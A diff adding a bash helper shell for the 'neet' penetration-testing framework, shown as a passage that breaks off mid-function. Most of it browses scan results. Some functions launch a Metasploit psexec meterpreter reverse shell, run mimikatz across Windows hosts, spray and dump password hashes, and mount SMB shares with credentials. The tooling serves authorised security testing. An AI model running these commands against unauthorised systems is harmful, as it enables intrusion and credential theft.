@@ -1,0 +1,1697 @@
+#!/bin/bash
+
+# Functions to make navigating neet results *much* easier.
+# This file should be sourced into an existing bash shell.
+
+# Functions starting with an underscore are internal to this script
+# and should not be called by the user
+
+# The other functions are the actual user commands.
+
+# Config File
+VERSION=1.0.0
+CONFIG="/opt/neet/etc/neet.conf"
+
+# Check we're in a valid directory
+if [ ! -d .neet ] || [ -f .neet/wd ]; then
+	# Check where the last one was
+  LD=`cat ${HOME}/.neet/wd`
+	if [ -d "$LD" ]; then
+		cd "$LD"
+	else
+		echo "Not in a valid neet results directory. Exiting"
+		exit 1
+	fi
+fi
+
+echo "neet shell initialising...."
+
+# Record top level directory
+export NeetTLD="$PWD"
+export NeetCTL="${PWD}/.neet"
+export INTERACT=${NeetCTL}/interaction
+
+# Resource Directory
+RD=`grep "^ResourceDirectory=" ${CONFIG} | awk -F= {print'$2'}`
+
+# Neet Log file
+NeetLOG=`grep "^LogFile=" ${CONFIG} | awk -F= {print'$2'}`
+NeetLOG="logs/$NeetLOG"
+
+# Bin Directory
+BaseD=`grep "^BasePrefix=" ${CONFIG} | awk -F= {print'$2'}`
+BD=${BaseD}/bin
+HELPERS=${BaseD}/helpers/bin
+
+# HTML Document location
+HTDD=${BaseD}/doc/html
+
+# HTML Viewer
+BROWSER=`grep "^Viewer.HTML=" ${CONFIG} | awk -F= {print'$2'}`
+
+# Metasploit
+MSF2=${BaseD}/external/framework2
+MSF=/opt/metasploit
+
+# Use IP addresses by default
+export useNames=0
+
+# IP to Name translator
+TRANSLATOR="${BaseD}/bin/ip2name"
+
+# Change our path
+export PATH="${BaseD}/external/bin:${BaseD}/external/framework:$PATH"
+
+# Import any customisations the user may have already set up the the shell from /etc/profile
+if [ -f /etc/profile ]; then
+	. /etc/profile
+fi
+
+# Clear any conflicting aliases and variables
+unalias quit help glo live win unix cli logon logoff logfile ip sock socket >/dev/null 2>&1
+unalias _alss _host _scanrunning _compromised _vuln _issues _osfam _numservices _numhosts _numwin _numnix _numoid >/dev/null 2>&1
+unset IP noMoreRefresh >/dev/null 2>&1
+
+# Set up some aliases. Normally I hate those interactive "rm", "cp" and "mv" commands. 
+# But as your mucking about with (maybe someone else's) test results, it's better to be safe.
+alias rm="rm -i"
+alias cp="cp -i"
+alias mv="mv -i"
+
+# Reporting aids. Pipe command output to these. svc https | ip will just show the IP addresses with https services.
+# svc https | socket will show all the sockets but no service into.
+alias iponly="awk -F: {print'\$1'}"
+alias socket="awk {print'\$1'}"
+alias sock="socket"
+
+
+# Directory colouring
+if [ -x /usr/bin/dircolors ]; then
+	eval "`dircolors -b`"
+	alias ls='ls --color=auto'
+fi
+
+# *** Set up logging
+
+LOGFILE="${NeetTLD}/logs/shell.log"
+LOGGING=1
+
+function _qlog {
+	local msg="$1"
+	if [ $LOGGING == 1 ]; then
+		local stamp=`date`
+		echo "$stamp: $msg" >> "$LOGFILE"
+	fi
+}
+
+function _log {
+	local msg="$1"
+	echo "$msg"
+	_qlog "$msg"
+}
+
+
+# *** ANSI COLOUR DEFINITIONS *** #
+# == Prompt
+
+PNONE="\[\033[0m\]"
+PBLACK="\[\033[30m\]"
+PBLUE="\[\033[34m\]"
+PGREEN="\[\033[32m\]"
+PCYAN="\[\033[36m\]"
+PRED="\[\033[31m\]"
+PBROWN="\[\033[33m\]"
+PDGRAY="\[\033[1;30m\]"
+PLBLUE="\[\033[1;34m\]"
+PLGREEN="\[\033[1;32m\]"
+PLCYAN="\[\033[1;36m\]"
+PLRED="\[\033[1;31m\]"
+PYELLOW="\[\033[1;33m\]"
+PLGRAY="\[\033[37m\]"
+PWHITE="\[\033[1;37m\]"
+
+# == Terminal
+
+RED='\e[0;31m'
+LRED='\e[1;31m'
+BLUE='\e[0;34m'
+LBLUE='\e[1;34m'
+CYAN='\e[0;36m'
+LCYAN='\e[1;36m'
+GREEN='\e[0;32m'
+LGREEN='\e[1;32m'
+GRAY='\e[1;30m'
+LGRAY='\e[0;37m'
+BROWN='\e[0;33m'
+NONE='\e[0m'
+
+# *** PROMPT STATUS COLOUR DEFINITIONS *** #
+PCOLCOMP="$PLRED" # Hosts that neet has got onto
+PCOLVULN="$PRED" # Hosts with issues, but neet hasn't actually got onto yet
+PCOLOK="$PLGREEN" # Hosts with no issues
+PCOLISSUES="$PBROWN" # Hosts with issues, but no actual exploitable "get me on" vulns
+
+# Change the prompt (won't muck about with PS2)
+OLDPS1="$PS1"
+DEFPS1="${PNONE}[S:\$(_numservices)][H:\$(_numhosts) W:\$(_numwin) U:\$(_numnix) O:\$(_numnoid)][\W]> "
+PS1="$DEFPS1"
+# NOTE - The Prompt should give plenty of info (IP, OS at least)
+
+# *** TERMINAL STATUS COLOUR DEFINITIONS *** #
+COLCOMP="$LRED" # Hosts that neet has got onto
+COLVULN="$RED" # Hosts with issues, but neet hasn't actually got onto yet
+COLOK="$LGREEN" # Hosts with no issues
+COLISSUES="$BROWN" # Hosts with issues, but no actual exploitable "get me on" vulns
+
+function __help {
+	cat ${BaseD}/resources/neetshellhelp.txt
+	if [ -d "${BaseD}/custom" ]; then
+		for dir in `find ${BaseD}/custom -maxdepth 1 -type d`; do
+			if [ -f "${dir}/neetshellhelp" ]; then
+				extension=`basename $dir`
+				echo "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
+				echo "Extension-specific help for \"$extension\"..."
+				echo
+				cat "${dir}/neetshellhelp"
+			fi
+		done
+	fi
+}
+
+function help {
+	# This provides help to the user
+	__help | less
+}
+
+function wincreds {
+	${BaseD}/bin/wincreds "$NeetTLD" "$RD"
+}
+
+function msfcli2 {
+	${BaseD}/external/framework2/msfcli
+}
+function msfcli {
+	/opt/metasploit/app/msfcli
+}
+
+# Fix in case aliases aren't working
+function hostmode {
+	if [ ! -z $1 ]; then
+		NEWIP=$1
+		if [ -f "${NeetTLD}/${NEWIP}/hostInfo.txt" ]; then
+			_host $NEWIP
+		fi
+	elif [ -f hostInfo.txt ]; then
+		if [ -z $IP ] || [ $IP != `basename $PWD` ]; then
+			# We're in a host directory but not in host mode
+			NEWIP=`basename $PWD`
+			_host $NEWIP
+		fi
+	else
+		echo "Use hostmode either within a host directory, or with an IP address supplied as an argument."
+	fi
+}
+
+function defaulthere {
+	# Sets the current directory as the default neetsh directory without having to run a scan
+	echo "$NeetTLD" > ${HOME}/.neet/wd
+}
+
+# **** Broad View Commands ****
+#   **********************
+
+function - {
+	if [ ! -z "$OLDHOST" ]; then
+		_host "$OLDHOST"
+	fi
+
+}
+
+function docs {
+	${BROWSER} ${HTDD}/neet.html &
+}
+
+function glo {
+	cd "$NeetTLD"
+	refresh
+	OLDHOST="$IP"
+	unset IP
+	unset HostDir
+	PS1="$DEFPS1"
+	_log "Global view selected"
+}
+
+function .. {
+	glo
+}
+
+function live {
+	local F="${NeetTLD}/liveHosts.txt"
+	if [ -f "$F" ]; then
+		#refresh
+		_lh "$F"
+	else
+		_log "Live host list not available"
+	fi
+}
+
+function hostswithservices {
+	if [ `ls ${NeetTLD}/services/*.txt 2>/dev/null| wc -l` -gt 0 ]; then
+		cat ${NeetTLD}/services/*.txt | iponly | sort -u
+	else
+		_log "No services have been discovered yet."
+	fi
+}
+
+function msf2 {
+	local od=$PWD
+	cd $MSF2 && ./msfcli $@ && cd $od
+}
+
+function meterpreter {
+	if [ -z $IP ]; then
+		echo "Must be run in host mode"
+	else
+		U=$1
+		P=$2
+		if [ -z $U ]; then
+			echo "Usage: meterpreter <user> <password>"
+		else
+			local od=$PWD
+			_log "Launching Meterpreter shell against $IP"
+			if [ -z $P ]; then
+				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
+				PAYLOAD=windows/meterpreter/reverse_tcp SMBUser="$U" E
+			else
+				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
+				PAYLOAD=windows/meterpreter/reverse_tcp SMBUser="$U" SMBPass="$P" E
+			fi
+			cd $od
+		fi
+	fi
+}
+
+function networks {
+	if [ -z $IP ]; then
+		echo "Must be run in host mode"
+	else
+		route -n | grep " $IP "
+	fi
+}
+
+
+function addnetwork {
+	if [ -z $IP ]; then
+		echo "Must be run in host mode"
+	else
+		N=$1
+		M=$2
+		if [ -z $M ]; then
+			echo "Usage: addnetwork <network address> <network mask>"
+		else
+			_log "Adding route to $N $M through $IP"
+			route add -net $N netmask $M gw $IP
+		fi
+	fi
+}
+
+function delnetwork {
+	if [ -z $IP ]; then
+		echo "Must be run in host mode"
+	else
+		N=$1
+		M=$2
+		if [ -z $M ]; then
+			echo "Usage: delnetwork <network address> <network mask>"
+		else
+			_log "Deleting route to $N $M through $IP"
+			route del -net $N netmask $M gw $IP
+		fi
+	fi
+}
+
+function issues {
+	if [ -z $IP ]; then
+		if [ -f "${NeetTLD}/masterIssues.txt" ]; then
+			cat ${NeetTLD}/masterIssues.txt | sort | $TRANSLATOR
+		else
+			echo "None"
+		fi
+	else
+		if [ -f "${NeetTLD}/masterIssues.txt" ]; then
+			#grep "^$IP:" ${NeetTLD}/masterIssues.txt | sort | $TRANSLATOR
+			egrep "^$IP\W" ${NeetTLD}/masterIssues.txt | sort | $TRANSLATOR
+		else
+			echo "None"
+		fi	
+	fi
+}
+
+function findport {
+	port=$1
+	if [ ! -z $port ]; then
+		for f in `find . -name tcpports.txt`; do if grep "^$port " $f >/dev/null; then echo $f; fi; done | perl -e '@a=<STDIN>;chomp @a;for $b (@a){$b=~s/^[\S\s]+\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/tcpports[\S\s]+/$1/; print "$b\n"}'
+		for f in `find . -name udpports.txt`; do if grep "^$port " $f >/dev/null; then echo $f; fi; done | perl -e '@a=<STDIN>;chomp @a;for $b (@a){$b=~s/^[\S\s]+\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/udpports[\S\s]+/$1/; print "$b\n"}'
+
+	else
+		echo "Usage: findport <port number>"
+	fi
+}
+
+function tcpports {
+	for f in `find . -name tcpports.txt`; do cat $f | awk {print'$1'}; done | sort -u | perl -e '@arg=<STDIN>; chomp @arg; print join (",", @arg) . "\n"'	
+}
+function udpports {
+	for f in `find . -name udpports.txt`; do cat $f | awk {print'$1'}; done | sort -u | perl -e '@arg=<STDIN>; chomp @arg; print join (",", @arg) . "\n"'	
+}
+
+function lowissues {
+	if [ -z $IP ]; then
+		if [ -f "${NeetTLD}/issues.txt" ]; then
+			cat "${NeetTLD}/issues.txt" | sort | $TRANSLATOR
+		else
+			echo "None"
+		fi
+	else
+		if [ -f "${NeetTLD}/issues.txt" ]; then
+			#grep "^$IP:" ${NeetTLD}/issues.txt | sort | $TRANSLATOR
+			grep "^$IP " "${NeetTLD}/issues.txt" | sort | $TRANSLATOR
+		else
+			echo "None"
+		fi	
+	fi
+}
+
+function info {
+	if [ -z $IP ]; then
+		echo "Need to be in host context to use this function."
+	else
+		[ -f "${HostDir}/hostInfo.txt" ] && cat "${HostDir}/hostInfo.txt"
+	fi
+}
+
+function os {
+	local T=$1
+	if [ -z $T ]; then
+		if [ -z $IP ]; then
+			echo "Which host do you mean?"
+		else
+			_os $IP
+		fi
+	else
+		_os $T
+	fi
+}
+
+function nfsmnt {
+	local T=$1
+	if [ -z $T ] || [ -z $IP ]; then
+		if [ -z $IP ]; then
+			echo "You must be in host context for this!"
+		else
+			cat "${HostDir}/nfsExports.txt"
+			echo "-------------------"
+			if [ -z $T ]; then
+				if mount -t nfs | grep "^${IP}:" >/dev/null 2>&1; then
+					echo "Showing NFS mounted from host $IP:"
+					mount -t nfs | grep "^${IP}:"
+				else
+					echo "Usage: nfsmnt <export>"
+				fi
+			fi
+		fi
+	else
+		if [ -f "${HostDir}/nfsExports.txt" ]; then
+			local matches=`grep "^$T " "${HostDir}/nfsExports.txt" 2>/dev/null | wc -l`
+			if [ $matches -eq 1 ]; then
+				# Mount the export
+				hostPath="/mnt/nfs/$IP"
+				mountPath="${hostPath}$T"
+				#mountPath="/mnt/nfs/${IP}$T"
+				mkdir -p "$mountPath"
+				if mount -t nfs | grep "^${IP}:$T "; then
+					echo "$T export is already mounted!"
+				else
+					mount -t nfs "${IP}:${T}" "$mountPath"
+					if [ $? -ne 0 ]; then
+						echo "Failed to mount $T from $IP"
+						rmdir "$mountPath"
+						rmdir "$hostPath" 2>/dev/null
+					else
+						echo "Successfully mounted $T on $mountPath"
+						echo
+						echo 'The "nfsnew" environment variable points to this path.'
+						export nfsnew="$mountPath"
+					fi
+				fi
+			else
+				echo "No exact match for export $T was found. Please be more specific."
+				cat "${HostDir}/nfsExports.txt"
+				echo "-------------------"
+			fi
+		else
+			echo "No NFS exports found for this host."
+		fi
+	fi
+}
+
+function nfsumnt {
+	if [ -z $IP ]; then
+		echo "You must be in host context for this!"
+	else
+		if mount -t nfs | grep "^${IP}:" >/dev/null 2>&1; then
+				hostPath="/mnt/nfs/$IP"
+				for export in `mount -t nfs | grep "^${IP}:" | awk {print'$1'} | sed -e s/^${IP}://`; do
+					mountPath="${hostPath}$export"
+					umount -t nfs "$mountPath"
+					if [ $? -eq 0 ]; then
+						echo "Umounted $export ($mountPath)"
+						rmdir "$mountPath"
+					else
+						echo "Failed to unmount $export ($mountPath)!"
+					fi
+
+				done
+				rmdir "$hostPath"
+		else
+				echo "There are no NFS exports from $IP mounted locally."
+		fi
+	fi
+}
+
+function testshares {
+	shares | "${HELPERS}"/testSmbShares.pl | tee ${NeetTLD}/anonymousShares.txt
+}
+
+function shares {
+	if [ -z $IP ]; then
+		local opwd=`pwd`
+		cd "$NeetTLD"
+		for ip in `find . -name shares.txt -exec /usr/bin/wc -l \{\} \; | grep netbios/shares.txt | grep -v ^0 | awk {print'$2'} | awk -F/ {print'$2'}`; do
+			echo "*** Shares on: $ip ***";
+			grep Disk ${ip}/netbios/shares.txt
+			echo
+		done
+		cd "$opwd"
+	else
+		if [ -f "${NeetTLD}/${IP}/netbios/shares.txt" ] && [ `wc -l "${NeetTLD}/${IP}/netbios/shares.txt" | awk {print'$1'}` -gt 0 ]; then
+			grep Disk "${NeetTLD}/${IP}/netbios/shares.txt"
+		else
+			echo "No shares"
+		fi
+	fi
+}
+
+function multikatz {
+	local opwd=`pwd`
+	cd "$NeetTLD"
+	if [ ! -f credentials ]; then
+		echo "You need to specify Windows credentials with the wincreds command."
+		return 1
+	elif [ -f windows.txt ]; then
+		# Try mimikatz across all hosts
+		rm -f mimicatz-credentials.txt
+		for ip in `cat windows.txt | awk {print'$1'}`; do
+			result=`${BaseD}/bin/checkcreds $ip`
+			if [ $? -eq 0 ]; then
+				account=`echo $result | awk -F" : " {print'$2'}`
+				password=`echo $result | awk -F" : " {print'$3'}`
+				cd $ip
+				echo "Trying mimikatz against ${ip}..."
+				/usr/bin/mimikatz $ip "$account" "$password"
+				cd "$NeetTLD"			
+				if [ -f "${ip}/passwords-${ip}.txt" ]; then
+					cat "${ip}/passwords-${ip}.txt" >> mimikatz-credentials.txt
+				fi
+			fi
+		done
+	else
+		echo "No windows hosts found!"
+		return 1
+	fi
+	cd "$opwd"
+}
+
+function browseshare {
+	if [ -z $3 ]; then
+		echo "Usage: browseshare <unc> [domain]\\<username> <password>"
+		return 1
+	fi
+
+	unc="$1"
+	user="$2"
+	pass="$3"
+
+	mountpoint="/mnt/smbtmp"
+	if [ ! -d "$mountpoint" ]; then
+		mkdir -p "$mountpoint" && touch "$mountpoint/unmounted"
+	fi
+
+	if [ ! -f "$mountpoint/unmounted" ]; then
+		echo "Can't use mountpoint $mountpoint - already in use."
+		return 1
+	else
+		mount.cifs $unc $mountpoint -o ro -o user=${user}%$pass
+		ERR=$?
+		if [ $ERR -eq 0 ]; then
+			nautilus $mountpoint --no-desktop --geometry 800x500 >/dev/null 2>&1 &
+		else
+			echo "Mount failed."
+		fi
+	fi
+}
+
+function exploreshares {
+	local opwd=`pwd`
+	cd "$NeetTLD"
+
+	if [ -z $2 ]; then
+		echo "Usage: exploreshares <username> <password> [domain]"
+		return 1
+	fi
+
+	user="$1"
+	pass="$2"
+	mkdir -p shares
+
+	if [ ! -z $3 ]; then
+		domain=$3
+		echo "username=$user" > shares/sharecreds.txt
+		echo "password=$pass" >> shares/sharecreds.txt
+		echo "domain=$domain" >> shares/sharecreds.txt
+	fi
+
+	mountpoint="/mnt/smb"
+
+	for ip in `grep 139 services/smb.txt | awk -F: {print'$1'}`; do
+		if [ ! -z $domain ]; then
+			smbclient -L //$ip -U "$domain\\$user"%"$pass" > ${ip}/smbshares.txt 2>/dev/null
+			ERR=$?
+		else
+			smbclient -L //$ip -U "$user"%"$pass" > ${ip}/smbshares.txt 2>/dev/null
+			ERR=$?
+		fi
+		if [ $ERR -gt 1 ]; then
+			echo $ip >> shares/failures.txt
+			rm -f ${ip}/smbshares.txt
+		else
+			mounted=0
+			for share in `grep " Disk " ${ip}/smbshares.txt | sed -e 's/ /_ASPACE_/g' | awk -F "_ASPACE_Disk_ASPACE_" {print'$1'}`; do
+				share=`echo $share | sed -e 's/_ASPACE_/ /g' -e 's/  //g' -e 's/ $//'`
+				SKIP=0
+				for skip in ADMIN$; do
+					if [ "$share" == "$skip" ]; then
+						SKIP=1
+						break
+					fi
+				done
+				if [ $SKIP -eq 1 ]; then
+					echo "Skipping $share on $ip"
+					continue
+				fi
+
+				echo "Enumerating share \"$share\" on $ip..."
+				if [ ! -z $domain ]; then
+					mount.cifs "//${ip}/$share" $mountpoint -o ro -o creds="${PWD}/shares/sharecreds.txt" 2>> shares/failures.txt
+					ERR=$?
+					if [ $ERR -eq 0 ]; then
+						mounted=1
+					fi
+				else
+					mount.cifs "//${ip}/$share" $mountpoint -o ro -o user="$user" -o password="$pass" 2>> shares/failures.txt
+					ERR=$?
+					if [ $ERR -eq 0 ]; then
+						mounted=1
+					fi
+				fi
+
+				if [ $mounted -eq 1 ]; then
+					# List the shares
+					find $mountpoint -maxdepth 4 | sed -e s?${mountpoint}?? -e s?^/?? > "${ip}/sharecontent-${share}.txt"
+					umount $mountpoint
+					mounted=0
+				else
+					echo "Failed to mount $ip $share" >> shares/failures.txt
+				fi
+			done
+		fi
+	done
+
+	rm -f shares/sharecreds.txt
+
+	cd "$opwd"
+}
+
+function addresses {
+	${HELPERS}/cross-reference-hostnames.pl	
+}
+
+function smbenum {
+	local opwd=`pwd`
+	cd "$NeetTLD"
+	if [ -z $IP ]; then
+		"${HELPERS}"/smbenum "$1" "$2" "$3"
+	else
+		"${HELPERS}"/smbenum $IP "$1" "$2"
+	fi
+	cd $opwd
+}
+
+function exploit {
+	local opwd=`pwd`
+	local T=$1
+	if [ -z $IP ]; then
+		echo "Need to be in host context to use this function."
+	else
+		cd "$NeetTLD"
+		${BD}/neet_exploit -h $IP
+		cd $opwd
+	fi
+}
+
+function uexploit {
+	local opwd=`pwd`
+	local T=$1
+	if [ -z $IP ]; then
+		echo "Which host do you mean?"
+	else
+		cd "$NeetTLD"
+		${BD}/neet_exploit -u -h $IP
+		cd $opwd
+	fi
+}
+
+function win {
+	local F="${NeetTLD}/windows.txt"
+	if [ -f "$F" ]; then
+		_lh "$F" ext
+	else
+		_log "Windows host list not available"
+	fi
+}
+
+function cisco {
+	local F="${NeetTLD}/cisco.txt"
+	if [ -f "$F" ]; then
+		_lh "$F" ext
+	fi
+}
+
+function domains {
+	local F="${NeetTLD}/domains.txt"
+	if [ -f "$F" ]; then
+		cat "$F"
+	else
+		_log "Domain list not available"
+	fi
+
+}
+
+function hashspray {
+	glo
+	hashfile=$1
+	[ -z $hashfile ] && hashfile="hashes.txt"
+	if [ ! -f $hashfile ]; then
+		echo "No hashes - $hashfile not present!"
+	else
+		[ -f domains.txt ] && cat domains.txt | awk {print'$1'} | sort -u > _domains
+		[ -f windows.txt ] && cat windows.txt | awk {print'$1'} | sort -u > _windows
+		if [ ! -f _windows ]; then
+			echo "No windows machines found!"
+		else
+			if [ -f _domains ]; then
+				${BaseD}/external/bin/keimpx.py -c $hashfile -l _windows -b -d _domains | tee sharedCredentials.txt
+			else
+				${BaseD}/external/bin/keimpx.py -c $hashfile -l _windows -b | tee sharedCredentials.txt
+			fi
+		fi
+		rm -f _domains _windows
+	fi
+}
+
+function gw {
+	local F="${NeetTLD}/forwarding.txt"
+	if [ -f "$F" ]; then
+		_lh "$F"
+	else
+		_log "Forwarding host list not available"
+	fi
+}
+
+function netconfig {
+	${HELPERS}/netconfig $@
+}
+
+function unix {
+	local F="${NeetTLD}/unix.txt"
+	if [ -f "$F" ]; then
+		_lh "$F" ext
+	else
+		_log "Unix host list not available"
+	fi
+}
+
+function svc {
+	refresh
+	[ ! -d "${NeetTLD}/services" ] && return
+	cd "${NeetTLD}/services"
+	if [ -z $IP ]; then
+		if [ -z $1 ]; then
+			for s in *; do
+				echo $s | sed -e 's/.txt//'
+			done
+		else
+			if [ -f "${NeetTLD}/services/${1}.txt" ]; then
+				cat "${NeetTLD}/services/${1}.txt" | $TRANSLATOR
+			fi
+		fi
+	else
+		if [ -z $1 ]; then
+			for s in *; do
+				if grep "^$IP " $s >/dev/null 2>&1 || grep "^${IP}:" $s >/dev/null 2>&1; then
+					echo $s | sed -e 's/.txt//'
+				fi
+			done
+		elif [ -f "${1}.txt" ]; then
+			grep "^$IP:" "${1}.txt" | $TRANSLATOR
+		fi
+	fi
+	cd - >/dev/null 2>&1
+}
+
+function scans {
+		echo running > $INTERACT
+}
+
+function debug {
+		echo debug > $INTERACT
+}
+
+function gsmsummary {
+		echo gsmsummary > $INTERACT
+}
+
+function threads {
+	ps x | grep "Neet - " | grep -v grep
+}
+
+
+function budget {
+	local value=$1
+	if [ ! -z $value ]; then
+		echo "Setting GSM performance budget to $value"
+		echo $value > $INTERACT
+	else
+		echo show > $INTERACT
+	fi
+}
+
+function disable {
+	local module=$1
+	if [ ! -z $module ]; then
+		echo "Disabling GSM module $module"
+		echo "disable $module" > $INTERACT
+	else
+		echo "usage: disable <GSM module>"
+	fi
+}
+
+function enable {
+	local module=$1
+	if [ ! -z $module ]; then
+		echo "Enabling GSM module $module"
+		echo "enable $module" > $INTERACT
+	else
+		echo "usage: disable <GSM module>"
+	fi
+}
+
+function load {
+	local value=$1
+	if [ ! -z $value ]; then
+		echo "Setting system load target to $value"
+		echo "load $value" > $INTERACT
+	else
+		echo "Usage: load [target load average (~300-450)]"
+		cat /proc/loadavg
+	fi
+}
+
+function queue {
+	echo queue > $INTERACT
+}
+
+function addinstance {
+	echo "incinstance $1" > $INTERACT
+}
+
+function delinstance {
+	echo "decinstance $1" > $INTERACT
+}
+
+function pause {
+	echo "pause" > $INTERACT
+}
+
+function stats {
+  # Needs to be the same in host AND global contexts
+  local NIP=$IP
+  unset IP
+  echo
+  echo "*** Statistics ***"
+  local totaladdr=`cat ${NeetCTL}/totalTargets`
+  if [ -f ${NeetTLD}/ARPscan-*.txt ]; then
+	totaladdr=`grep "is up" ARPscan-*.txt 2>/dev/null | wc -l`
+  fi
+  local sdmcompleted=`cat ${NeetCTL}/sdmscomplete.nt 2>/dev/null| wc -c`
+  echo "Service discovery completed on $sdmcompleted of $totaladdr hosts"
+  local sdmrun=`threads | grep "Service Discovery" | wc -l`
+  [ $sdmrun -ne 0 ] && echo "Service discovery still running on $sdmrun hosts"
+  local gsmrun=`threads | grep "GSM:" | wc -l`
+  if [ $gsmrun -eq 1 ]; then
+    echo "$gsmrun Global Service Monitor is still running"
+  else
+    echo "$gsmrun Global Service Monitors are still running"
+  fi
+  echo
+  scans
+  echo
+  IP=$NIP
+}
+
+function useboth {
+	if [ $useNames -eq 0 ] || [ $useNames -eq 1 ]; then
+		echo "Using host IP AND names where possible"
+		export useNames=2
+	fi
+}
+
+function usenames {
+	if [ $useNames -eq 0 ] || [ $useNames -eq 2 ]; then
+		echo "Using host names where possible"
+		export useNames=1
+	fi
+}
+
+function nonames {
+	if [ $useNames -eq 1 ] || [ $useNames -eq 2 ]; then
+		echo "NOT using host names"
+		export useNames=0
+	fi
+}
+
+
+function search {
+	local id=.${$}search
+	local file=$1
+	local term=$2
+	local showhost=$3
+	if [ -z "$2" ]; then
+		echo "Usage: search File \"search phrase\" [hosts]"
+	else
+		local found=0
+		local hosts=0
+		[ ! -z $showhost ] && hosts=1
+		for f in `find . -type f -name "${file}*"`; do
+			local instances=`grep "$term" "$f" 2>/dev/null | wc -l`
+			if [ $instances -gt 0 ]; then
+				local path=`echo $f | sed -e 's?^./??'`
+				if [ $hosts -eq 0 ]; then
+					echo "*** $path ***" >> $id
+					grep "$term" "$f" >> $id 2>&1
+					echo >> $id
+				else
+					local ip=`echo $path | awk -F/ {print'$1'}`
+					echo $ip >> $id
+				fi
+				(( found += instances ))
+			fi
+		done
+		if [ -f $id ]; then
+			echo "$found items found"
+			echo
+			if [ $hosts -eq 0 ]; then
+				cat $id | $TRANSLATOR
+			else
+				cat $id | sort -u | $TRANSLATOR
+			fi
+			rm -f $id
+		fi
+	fi
+}
+
+function modules {
+		grep "Loaded module" "${NeetTLD}/${NeetLOG}"
+}
+
+function vuln {
+	if [ -f "${NeetTLD}/vulnerabilities.txt" ]; then
+		if [ -z $IP ]; then
+			cat "${NeetTLD}/vulnerabilities.txt" | $TRANSLATOR
+			#grep \\[VULN\\] "${NeetTLD}/${NeetLOG}" | $TRANSLATOR
+		else
+			egrep "^$IP\W" "${NeetTLD}/vulnerabilities.txt" | $TRANSLATOR
+			#grep "^$IP.\[" "${NeetTLD}/vulnerabilities.txt" | $TRANSLATOR
+			#grep "^$IP:" "${NeetTLD}/vulnerabilities.txt" | $TRANSLATOR
+			#grep \\[VULN\\] "${NeetTLD}/${NeetLOG}" | grep ${IP} | $TRANSLATOR
+		fi
+	else
+		echo "None"
+	fi
+}
+
+function comp {
+	if [ -f "${NeetTLD}/compromises.txt" ]; then
+		if [ -z $IP ]; then
+			cat "${NeetTLD}/compromises.txt"
+	 	else
+			egrep "^$IP\W" "${NeetTLD}/compromises.txt"
+			#grep "^$IP " "${NeetTLD}/compromises.txt"
+		fi
+	else
+		echo "None"
+	fi
+}
+
+function print {
+	local tmp="${NeetTLD}/.neetshelltmp"
+	[ -f $tmp ] && rm -f $tmp
+	for host in `cat ${NeetTLD}/liveHosts.txt 2>/dev/null`; do
+		if grep "DeviceType Printer" "${NeetTLD}/${host}/hostInfo.txt" >/dev/null 2>&1; then
+			echo $host >> $tmp
+		fi
+	done
+	_lh "$tmp"
+	rm -f $tmp
+}
+
+function snmp {
+	if [ ! -z $IP ] && [ -f snmpMIB*.txt ]; then
+		cat snmpMIB*.txt | less
+	else
+		local tmp="${NeetTLD}/.neetshelltmp"
+		[ -f $tmp ] && rm -f $tmp
+		for host in `cat ${NeetTLD}/services/SNMP_Read.txt ${NeetTLD}/services/SNMP_Write.txt 2>/dev/null | awk {print'$1'} | sort -u`; do
+			echo "$host" >> $tmp
+		done
+		_lh "$tmp"
+		rm -f $tmp
+	fi
+}
+
+# **** Host Context Commands ****
+#   **********************
+
+function audit {
+	if [ -z $IP ]; then
+		echo "Switch to host mode to run an audit."
+	elif grep "^OSFamily Windows" hostInfo.txt >/dev/null 2>&1; then
+		if grep "^AddedAccount " hostInfo.txt >/dev/null 2>&1; then
+			if [ -z $2 ]; then
+				local user=`grep "^NewUser=" $CONFIG | awk -F= {print'$2'}`
+				local pass=`grep "^NewPassword=" $CONFIG | awk -F= {print'$2'}`
+				winaudit $IP "$user" "$pass"
+			else
+				winaudit $IP "$1" "$2"
+			fi
+		elif [ -z $2 ]; then
+			echo "Usage: audit <username> <password>"
+		else
+			winaudit $IP "$1" "$2"
+		fi
+	else
+		echo "Audit is currently implemented only for Windows hosts."
+	fi
+}
+
+function hashdump {
+	if [ -z $IP ]; then
+		echo "Switch to host mode to dump hashes."
+	elif grep "^OSFamily Windows" hostInfo.txt >/dev/null 2>&1; then
+		if grep "^AddedAccount " hostInfo.txt >/dev/null 2>&1; then
+			if [ -z $2 ]; then
+				local user=`grep "^NewUser=" $CONFIG | awk -F= {print'$2'}`
+				local pass=`grep "^NewPassword=" $CONFIG | awk -F= {print'$2'}`
+				gethash $IP "$user" "$pass"
+			else
+				gethash $IP "$1" "$2"
+			fi
+		elif [ -z $2 ]; then
+			echo "Usage: hashdump <username> <password>"
+		else
+			gethash $IP "$1" "$2"
+		fi
+	else
+		echo "Hashdump is implemented only for Windows hosts."
+	fi
+}
+
+function mbsa {
+	local enable=0
+	local USERPASS
+	CDIR=`basename $PWD`
+	if [ -z $IP ]; then
+		TARGET=$1
+		if [ -z $TARGET ] || [ ! -d $TARGET ] || [ $CDIR -ne $TARGET ]; then
+			echo "You need to specify a valid target IP address and valid credentials for the target host."
+			echo "Usage: mbsa [target] <username:password>"
+		else
+			if [ ! -z $2 ]; then
+				USERPASS="$2"
+				enable=1
+			else
+				echo "You need to specify a valid target IP address and valid credentials for the target host."
+				echo "Usage: mbsa [target] <username:password>"
+			fi		
+		fi
+	else
+		TARGET=$IP
+		if [ ! -z $1 ]; then
+			USERPASS="$1"
+			enable=1
+		else
+			echo "You need to specify valid credentials for the target host."
+			echo "Usage: mbsa [target] <username:password>"
+		fi		
+	fi
+
+
+	if [ ! -z $enable ] && [ $enable -eq 1 ]; then
+		local OUTFILE="MBSA-${TARGET}.txt"
+	
+		if [ -d $TARGET ]; then
+			OUTFILE="${TARGET}/MBSA.txt"
+		elif [ `basename $PWD` == $TARGET ]; then
+			OUTFILE="MBSA.txt"
+		fi
+
+		local WINHELP=`cat $CONFIG | grep ^Address.WindowsHelper= | awk -F= {print'$2'}`
+		local USER=`cat $CONFIG | grep ^Account.WindowsHelper= | awk -F= {print'$2'}`
